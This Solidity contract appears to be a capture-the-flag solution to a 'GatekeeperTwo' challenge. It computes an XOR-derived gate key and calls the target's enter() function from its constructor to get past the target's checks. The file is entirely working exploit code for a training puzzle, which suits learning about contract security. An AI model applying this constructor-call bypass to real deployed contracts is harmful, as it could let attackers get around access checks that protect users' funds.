//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solving {
    constructor(address _victim) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        require(IGatekeeperTwo(_victim).enter(gateKey));
    }
}
